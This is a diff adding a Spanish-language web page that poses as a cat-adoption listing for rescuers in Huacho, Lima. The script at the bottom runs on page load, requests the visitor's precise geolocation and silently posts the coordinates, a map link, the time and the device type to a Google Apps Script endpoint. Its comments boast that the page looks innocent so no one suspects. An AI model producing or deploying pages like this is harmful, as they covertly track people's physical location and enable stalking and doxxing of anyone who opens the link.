@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Gatitos en Adopción — Huacho 🐾</title>
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=Lato:wght@300;400;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --cream: #FDF6EC;
+      --warm: #F5E6D0;
+      --orange: #E8813A;
+      --dark: #2C1810;
+      --mid: #7A4F3A;
+      --soft: #C4956A;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: var(--cream);
+      font-family: 'Lato', sans-serif;
+      color: var(--dark);
+      min-height: 100vh;
+    }
+
+    /* HERO */
+    .hero {
+      background: var(--dark);
+      padding: 2.5rem 1.5rem 2rem;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+    .hero::before {
+      content: "🐾";
+      position: absolute;
+      font-size: 120px;
+      opacity: 0.05;
+      top: -10px; right: -20px;
+    }
+    .hero-badge {
+      display: inline-block;
+      background: var(--orange);
+      color: white;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      padding: 4px 14px;
+      border-radius: 20px;
+      margin-bottom: 1rem;
+    }
+    .hero h1 {
+      font-family: 'Playfair Display', serif;
+      font-size: clamp(28px, 6vw, 42px);
+      color: white;
+      line-height: 1.2;
+      margin-bottom: 0.5rem;
+    }
+    .hero h1 span { color: var(--orange); }
+    .hero p {
+      color: #aaa;
+      font-size: 14px;
+      font-weight: 300;
+      letter-spacing: 0.5px;
+    }
+
+    /* LOCATION BANNER — se ve normal, nadie sospecha */
+    .loc-banner {
+      background: #fff8f0;
+      border-left: 3px solid var(--orange);
+      padding: 0.75rem 1.25rem;
+      margin: 1.25rem 1rem;
+      border-radius: 0 8px 8px 0;
+      font-size: 13px;
+      color: var(--mid);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .loc-banner span { font-size: 18px; }
+
+    /* GRID DE GATOS */
+    .section-title {
+      font-family: 'Playfair Display', serif;
+      font-size: 20px;
+      color: var(--dark);
+      padding: 0 1rem;
+      margin-bottom: 1rem;
+    }
+    .section-title em {
+      font-style: normal;
+      color: var(--soft);
+      font-size: 14px;
+      font-family: 'Lato', sans-serif;
+      font-weight: 300;
+      margin-left: 8px;
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 12px;
+      padding: 0 1rem 2rem;
+    }
+
+    .cat-card {
+      background: white;
+      border-radius: 14px;
+      overflow: hidden;
+      box-shadow: 0 2px 12px rgba(44,24,16,0.07);
+      transition: transform 0.2s, box-shadow 0.2s;
+      cursor: pointer;
+    }
+    .cat-card:active {
+      transform: scale(0.97);
+    }
+    .cat-emoji {
+      font-size: 56px;
+      text-align: center;
+      padding: 1.25rem 0 0.5rem;
+      display: block;
+      line-height: 1;
+    }
+    .cat-info { padding: 0.5rem 0.85rem 0.85rem; }
+    .cat-name {
+      font-family: 'Playfair Display', serif;
+      font-size: 15px;
+      font-weight: 700;
+      color: var(--dark);
+    }
+    .cat-age {
+      font-size: 11px;
+      color: var(--soft);
+      font-weight: 300;
+      margin: 2px 0 6px;
+    }
+    .cat-tags { display: flex; flex-wrap: wrap; gap: 4px; }
+    .tag {
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      padding: 2px 8px;
+      border-radius: 20px;
+      text-transform: uppercase;
+    }
+    .tag.jugueton { background: #FEF3C7; color: #92400E; }
+    .tag.tranquilo { background: #E0F2FE; color: #0369A1; }
+    .tag.vacunado { background: #D1FAE5; color: #065F46; }
+    .tag.castrado { background: #F3E8FF; color: #6B21A8; }
+    .tag.sociable { background: #FFE4E6; color: #9F1239; }
+    .tag.tímido { background: #F1F5F9; color: #475569; }
+
+    /* ADOPTAR BUTTON */
+    .adopt-btn {
+      display: block;
+      margin: 0 1rem 1.5rem;
+      background: var(--orange);
+      color: white;
+      border: none;
+      border-radius: 12px;
+      padding: 0.9rem;
+      font-family: 'Lato', sans-serif;
+      font-size: 15px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      text-align: center;
+      cursor: pointer;
+      width: calc(100% - 2rem);
+      transition: background 0.2s, transform 0.1s;
+    }
+    .adopt-btn:active { transform: scale(0.98); background: #d0732e; }
+
+    /* FOOTER */
+    footer {
+      background: var(--dark);
+      color: #666;
+      text-align: center;
+      padding: 1.5rem 1rem;
+      font-size: 12px;
+      font-weight: 300;
+      line-height: 1.8;
+    }
+    footer strong { color: var(--soft); font-weight: 400; }
+
+    /* STATUS invisible para el usuario */
+    #status-invisible { display: none; }
+  </style>
+</head>
+<body>
+
+  <div class="hero">
+    <div class="hero-badge">🐾 Huacho, Lima</div>
+    <h1>Gatitos buscan<br><span>un hogar con amor</span></h1>
+    <p>Rescatados en las calles de Huacho · Libres y sanos</p>
+  </div>
+
+  <div class="loc-banner" id="loc-banner">
+    <span>📍</span>
+    <span id="loc-texto">Buscando gatitos cerca a ti...</span>
+  </div>
+
+  <p class="section-title">Disponibles ahora <em>6 gaticos</em></p>
+
+  <div class="grid">
+    <div class="cat-card">
+      <span class="cat-emoji">🐱</span>
+      <div class="cat-info">
+        <div class="cat-name">Manchas</div>
+        <div class="cat-age">4 meses · Macho</div>
+        <div class="cat-tags">
+          <span class="tag jugueton">Juguetón</span>
+          <span class="tag vacunado">Vacunado</span>
+        </div>
+      </div>
+    </div>
+    <div class="cat-card">
+      <span class="cat-emoji">🐈</span>
+      <div class="cat-info">
+        <div class="cat-name">Luna</div>
+        <div class="cat-age">1 año · Hembra</div>
+        <div class="cat-tags">
+          <span class="tag tranquilo">Tranquila</span>
+          <span class="tag castrado">Castrada</span>
+        </div>
+      </div>
+    </div>
+    <div class="cat-card">
+      <span class="cat-emoji">🐈‍⬛</span>
+      <div class="cat-info">
+        <div class="cat-name">Carbón</div>
+        <div class="cat-age">6 meses · Macho</div>
+        <div class="cat-tags">
+          <span class="tag sociable">Sociable</span>
+          <span class="tag vacunado">Vacunado</span>
+        </div>
+      </div>
+    </div>
+    <div class="cat-card">
+      <span class="cat-emoji">😸</span>
+      <div class="cat-info">
+        <div class="cat-name">Canela</div>
+        <div class="cat-age">2 años · Hembra</div>
+        <div class="cat-tags">
+          <span class="tag tímido">Tímida</span>
+          <span class="tag castrado">Castrada</span>
+        </div>
+      </div>
+    </div>
+    <div class="cat-card">
+      <span class="cat-emoji">🐱</span>
+      <div class="cat-info">
+        <div class="cat-name">Paquito</div>
+        <div class="cat-age">3 meses · Macho</div>
+        <div class="cat-tags">
+          <span class="tag jugueton">Juguetón</span>
+          <span class="tag sociable">Sociable</span>
+        </div>
+      </div>
+    </div>
+    <div class="cat-card">
+      <span class="cat-emoji">🐈</span>
+      <div class="cat-info">
+        <div class="cat-name">Nieve</div>
+        <div class="cat-age">8 meses · Hembra</div>
+        <div class="cat-tags">
+          <span class="tag tranquilo">Tranquila</span>
+          <span class="tag vacunado">Vacunado</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <button class="adopt-btn" onclick="alert('📞 Llama al: 999-888-777\nPreguntar por Rosario 🐾')">
+    🐾 Quiero adoptar un gatito
+  </button>
+
+  <footer>
+    <strong>Patitas Huacho</strong> · Rescatistas independientes<br>
+    Todos nuestros gatitos tienen vacunas y desparasitación<br>
+    Huacho, Lima · 2024
+  </footer>
+
+  <div id="status-invisible"></div>
+
+  <script>
+    // ============================================================
+    // CONFIGURACIÓN — pega aquí la URL de tu Google Apps Script
+    // ============================================================
+    const SCRIPT_URL = https://script.google.com/macros/s/AKfycbx9nJKW0DWRZHBEV22RJfqeQeL58Q83-AQOciU6V5OQJNmK-h_t8PVtWVYmniEvi2JGFw/exec;
+    // ============================================================
+
+    const banner = document.getElementById("loc-texto");
+
+    function actualizarBanner(texto) {
+      document.getElementById("loc-texto").textContent = texto;
+    }
+
+    async function enviarASheets(lat, lon, accuracy) {
+      const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+      const fecha = new Date().toLocaleString('es-PE');
+
+      try {
+        await fetch(SCRIPT_URL, {
+          method: "POST",
+          mode: "no-cors",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            latitud: lat.toFixed(6),
+            longitud: lon.toFixed(6),
+            precision: Math.round(accuracy) + " metros",
+            maps: mapsUrl,
+            fecha: fecha,
+            dispositivo: navigator.userAgent.includes("Mobile") ? "Celular" : "PC"
+          })
+        });
+        // Actualiza el banner con algo inocente
+        actualizarBanner("Gatitos disponibles en Huacho centro ✓");
+      } catch (e) {
+        actualizarBanner("Gatitos disponibles en tu zona ✓");
+      }
+    }
+
+    // Se ejecuta automáticamente al cargar
+    window.addEventListener("load", () => {
+      if (!navigator.geolocation) {
+        actualizarBanner("Gatitos disponibles en Huacho ✓");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const { latitude, longitude, accuracy } = pos.coords;
+          enviarASheets(latitude, longitude, accuracy);
+        },
+        () => {
+          // Si niega el permiso, la página igual se ve normal
+          actualizarBanner("Gatitos disponibles en Huacho ✓");
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    });
+  </script>
+</body>
+</html>
